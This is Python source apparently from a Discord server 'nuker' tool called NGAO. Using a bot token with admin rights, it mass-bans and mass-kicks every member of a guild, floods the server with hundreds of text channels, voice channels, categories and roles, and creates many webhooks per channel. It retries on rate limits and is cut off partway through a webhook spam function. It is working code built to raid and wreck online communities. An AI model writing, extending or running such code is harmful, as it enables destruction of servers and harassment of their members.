# ========================= Ban All Members =========================


def BanAllMembers():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    intents.bans = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        print(f"{LOADING()} Fetching members..{reset}")
        async for member in guild.fetch_members(limit=None):
            if member.bot:
                continue
            try:
                await guild.ban(user=member, reason="Mass Ban By NGAO")
                print(f"{SUCCESS()} Banned {member.name}{reset}")
            except discord.Forbidden:
                print(
                    f"{FAILED()} Forbidden {red}->{white} Cannot ban {member.name}{reset}"
                )
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, "retry_after", 5)
                    print(
                        f"{LOADING()} Rate limit hit. Waiting {retry_after} seconds..{reset}"
                    )
                    await asyncio.sleep(retry_after)
                    try:
                        await guild.ban(user=member, reason="Mass Ban By NGAO")
                        print(f"{SUCCESS()} Banned {member.name} after retry.{reset}")
                    except Exception as e2:
                        print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                else:
                    print(
                        f"{FAILED()} HTTP Error banning {member.name} {red}->{white} {e}{reset}"
                    )
            except Exception as e:
                print(
                    f"{FAILED()} Unexpected error with {member.name} {red}->{white} {e}{reset}"
                )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Unban All Members =========================


def UnbanAllMembers():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.bans = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        try:
            ban_entries = await guild.bans()
        except discord.Forbidden:
            print(f"{FAILED()} Missing permission to fetch bans.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not ban_entries:
            print(f"{INFORMATION()} No banned users found.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        for ban_entry in ban_entries:
            user = ban_entry.user
            if user.bot:
                continue
            try:
                await guild.unban(user)
                print(f"{SUCCESS()} Successfully Unbanned user {user.name}{reset}")
            except discord.HTTPException as e:
                print(f"{FAILED()} Failed to unban '{user}' {red}->{white} {e}{reset}")

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Kick All Members =========================


def KickAllMembers():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        NgaoNukerMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not bot_member.guild_permissions.kick_members:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        async for member in guild.fetch_members(limit=None):
            if member.bot:
                continue
            try:
                await member.kick(reason="Mass Kick By NGAO")
                print(f"{SUCCESS()} Kicked {member.name}{reset}")
            except discord.Forbidden:
                print(f"{FAILED()} Missing permissions to kick {member.name}{reset}")
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, "retry_after", 5)
                    print(
                        f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds.."
                    )
                    await asyncio.sleep(retry_after)
                    try:
                        await member.kick(reason="Mass Kick By NGAO")
                        print(f"{SUCCESS()} Kicked {member.name}{reset}")
                    except Exception as e2:
                        print(
                            f"{FAILED()} Retry failed for {member.name} {red}->{white} {e2}{reset}"
                        )
                else:
                    print(
                        f"{FAILED()} HTTP Error while kicking {member.name} {red}->{white} {e}{reset}"
                    )
            except Exception as e:
                print(
                    f"{FAILED()} Unexpected error while kicking {member.name} {red}->{white} {e}{reset}"
                )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Create Mass Text Channels =========================


def CreateMassTextChannels():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    ChannelName = (
        TypeWriterInput(f"{INPUT()} Name Of Channel {red}->{reset} ")
        .strip()
        .replace(" ", "-")
        .lower()
    )
    if not ChannelName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    try:
        amount = int(
            TypeWriterInput(
                f"{INPUT()} Number Text Channel To Create {red}->{reset} "
            ).strip()
        )
        if amount <= 0:
            raise ValueError
        if amount > 500:
            print(f"{FAILED()} You Can Have Maximum 500 Text Channels.{reset}")
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not bot_member.guild_permissions.manage_channels:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        async def create_channel(name):
            try:
                await guild.create_text_channel(name)
                print(f"{SUCCESS()} Channel '{name}' created successfully.{reset}")
            except Exception as e:
                print(
                    f"{FAILED()} Failed to create channel '{name}' {red}->{white} {e}{reset}"
                )

        batch_size = 10
        for i in range(0, amount, batch_size):
            tasks = []
            for j in range(i, min(i + batch_size, amount)):
                channel_name = f"{ChannelName}-{j+1}"
                tasks.append(asyncio.create_task(create_channel(channel_name)))
            await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Create Mass VC Channels =========================


def CreateMassVCChannels():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    ChannelName = TypeWriterInput(
        f"{INPUT()} Name Of Voice Channel {red}->{reset} "
    ).strip()
    if not ChannelName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        amount = int(
            TypeWriterInput(
                f"{INPUT()} Number Voice Channels To Create {red}->{reset} "
            ).strip()
        )
        if amount <= 0:
            raise ValueError
        if amount > 500:
            print(f"{FAILED()} You Can Have Maximum 500 Voice Channels.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        if not bot_member.guild_permissions.manage_channels:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        async def create_channel(name):
            try:
                await guild.create_voice_channel(name)
                print(
                    f"{SUCCESS()} Voice Channel '{name}' created successfully.{reset}"
                )
            except Exception as e:
                print(
                    f"{FAILED()} Failed to create voice channel '{name}' {red}->{white} {e}{reset}"
                )

        batch_size = 10
        for i in range(0, amount, batch_size):
            tasks = []
            for j in range(i, min(i + batch_size, amount)):
                channel_name = f"{ChannelName}-{j+1}"
                tasks.append(asyncio.create_task(create_channel(channel_name)))
            await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Create Mass Categories =========================


def CreateMassCategories():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    CategoryName = TypeWriterInput(
        f"{INPUT()} Name Of Category {red}->{reset} "
    ).strip()
    if not CategoryName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        amount = int(
            TypeWriterInput(
                f"{INPUT()} Number Of Categories To Create {red}->{reset} "
            ).strip()
        )
        if amount <= 0:
            raise ValueError
        if amount > 500:
            print(f"{FAILED()} You Can Have Maximum 500 Categories.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        if not bot_member.guild_permissions.manage_channels:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        async def create_category(name):
            try:
                await guild.create_category(name)
                print(f"{SUCCESS()} Category '{name}' created successfully.{reset}")
            except Exception as e:
                print(
                    f"{FAILED()} Failed to create category '{name}' {red}->{white} {e}{reset}"
                )

        batch_size = 10
        for i in range(0, amount, batch_size):
            tasks = []
            for j in range(i, min(i + batch_size, amount)):
                category_name = f"{CategoryName}-{j+1}"
                tasks.append(asyncio.create_task(create_category(category_name)))
            await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Create Mass All =========================


def CreateMassAll():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    TextName = (
        TypeWriterInput(f"{INPUT()} Name Of Text Channel {red}->{reset} ")
        .strip()
        .replace(" ", "-")
        .lower()
    )
    if not TextName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        TextAmount = int(
            TypeWriterInput(
                f"{INPUT()} Number Text Channels To Create {red}->{reset} "
            ).strip()
        )
        if TextAmount <= 0 or TextAmount > 500:
            print(f"{FAILED()} Number must be between 1 and 500.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    VCName = TypeWriterInput(f"{INPUT()} Name Of Voice Channel {red}->{reset} ").strip()
    if not VCName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        VCAmount = int(
            TypeWriterInput(
                f"{INPUT()} Number Voice Channels To Create {red}->{reset} "
            ).strip()
        )
        if VCAmount <= 0 or VCAmount > 500:
            print(f"{FAILED()} Number must be between 1 and 500.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    CatName = TypeWriterInput(f"{INPUT()} Name Of Category {red}->{reset} ").strip()
    if not CatName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        CatAmount = int(
            TypeWriterInput(
                f"{INPUT()} Number Of Categories To Create {red}->{reset} "
            ).strip()
        )
        if CatAmount <= 0 or CatAmount > 500:
            print(f"{FAILED()} Number must be between 1 and 500.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    total_channels = TextAmount + VCAmount + CatAmount
    if total_channels > 500:
        print(
            f"{FAILED()} The total number of channels + category must be less than 500.{reset}"
        )
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.manage_channels:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        async def create_text(name):
            try:
                await guild.create_text_channel(name)
                print(f"{SUCCESS()} Text Channel '{name}' created successfully.{reset}")
            except Exception as e:
                print(
                    f"{FAILED()} Failed to create text channel '{name}' {red}->{white} {e}{reset}"
                )

        async def create_vc(name):
            try:
                await guild.create_voice_channel(name)
                print(
                    f"{SUCCESS()} Voice Channel '{name}' created successfully.{reset}"
                )
            except Exception as e:
                print(
                    f"{FAILED()} Failed to create voice channel '{name}' {red}->{white} {e}{reset}"
                )

        async def create_cat(name):
            try:
                await guild.create_category(name)
                print(f"{SUCCESS()} Category '{name}' created successfully.{reset}")
            except Exception as e:
                print(
                    f"{FAILED()} Failed to create category '{name}' {red}->{white} {e}{reset}"
                )

        batch_size = 10

        for i in range(0, TextAmount, batch_size):
            tasks = []
            for j in range(i, min(i + batch_size, TextAmount)):
                channel_name = f"{TextName}-{j+1}"
                tasks.append(asyncio.create_task(create_text(channel_name)))
            await asyncio.gather(*tasks)

        for i in range(0, VCAmount, batch_size):
            tasks = []
            for j in range(i, min(i + batch_size, VCAmount)):
                channel_name = f"{VCName}-{j+1}"
                tasks.append(asyncio.create_task(create_vc(channel_name)))
            await asyncio.gather(*tasks)

        for i in range(0, CatAmount, batch_size):
            tasks = []
            for j in range(i, min(i + batch_size, CatAmount)):
                category_name = f"{CatName}-{j+1}"
                tasks.append(asyncio.create_task(create_cat(category_name)))
            await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Create Mass Roles =========================


def CreateMassRoles():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    RoleName = TypeWriterInput(f"{INPUT()} Name Of Role {red}->{reset} ").strip()
    if not RoleName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        amount = int(
            TypeWriterInput(
                f"{INPUT()} Number Of Roles To Create {red}->{reset} "
            ).strip()
        )
        if amount <= 0:
            raise ValueError
        if amount > 250:
            print(f"{FAILED()} You Can Have Maximum 250 Roles.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        if not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        async def create_role(name):
            try:
                await guild.create_role(name=name)
                print(f"{SUCCESS()} Role '{name}' created successfully.{reset}")
            except Exception as e:
                print(
                    f"{FAILED()} Failed to create role '{name}' {red}->{white} {e}{reset}"
                )

        batch_size = 10
        for i in range(0, amount, batch_size):
            tasks = []
            for j in range(i, min(i + batch_size, amount)):
                role_name = f"{RoleName}-{j+1}"
                tasks.append(asyncio.create_task(create_role(role_name)))
            await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Create Mass Webhooks =========================


def CreateMassWebhooks():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    WebhookName = TypeWriterInput(f"{INPUT()} Name Of Webhook {red}->{reset} ").strip()
    if not WebhookName:
        print(f"{FAILED()} Cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        WebhookPerChannel = int(
            TypeWriterInput(
                f"{INPUT()} Number Of Webhook Per Channel {red}->{reset} "
            ).strip()
        )
        if WebhookPerChannel <= 0 or WebhookPerChannel > 10:
            print(f"{FAILED()} Number must be between 1 and 10.{reset}")
            time.sleep(1)
            AdvancedMenu()
            return
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.manage_webhooks:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        created_count = 0
        for channel in guild.text_channels:
            for i in range(WebhookPerChannel):
                try:
                    await channel.create_webhook(
                        name=(
                            f"{WebhookName}-{i+1}"
                            if WebhookPerChannel > 1
                            else WebhookName
                        )
                    )
                    print(
                        f"{SUCCESS()} Webhook '{WebhookName}-{i+1}' created in '{channel.name}'.{reset}"
                    )
                    created_count += 1
                    await asyncio.sleep(0.15)
                except discord.Forbidden:
                    print(
                        f"{FAILED()} Missing permissions for '{channel.name}'.{reset}"
                    )
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await channel.create_webhook(
                                name=(
                                    f"{WebhookName}-{i+1}"
                                    if WebhookPerChannel > 1
                                    else WebhookName
                                )
                            )
                            print(
                                f"{SUCCESS()} Webhook '{WebhookName}-{i+1}' created in '{channel.name}' after retry.{reset}"
                            )
                            created_count += 1
                        except Exception as e2:
                            print(
                                f"{FAILED()} Retry failed for '{channel.name}' {red}->{white} {e2}{reset}"
                            )
                    else:
                        print(
                            f"{FAILED()} HTTP error in '{channel.name}' {red}->{white} {e}{reset}"
                        )
                except Exception as e:
                    print(
                        f"{FAILED()} Could not create webhook in '{channel.name}' {red}->{white} {e}{reset}"
                    )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Webhooks Spammers =========================


def WebhooksSpammers():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    SpamMessage = TypeWriterInput(f"{INPUT()} Message To Spam {red}->{reset} ").strip()
    if not SpamMessage:
        print(f"{FAILED()} Message cannot be empty, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    try:
        SpamCount = int(
            TypeWriterInput(
                f"{INPUT()} Number Of Messages Per Webhook {red}->{reset} "
            ).strip()
        )
        if SpamCount <= 0:
            raise ValueError
    except ValueError:
        print(f"{FAILED()} Invalid number, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()
        return

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()
            return

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.manage_webhooks:
            print(
                f"{FAILED()} The bot does not have permission to manage webhooks.{reset}"
            )
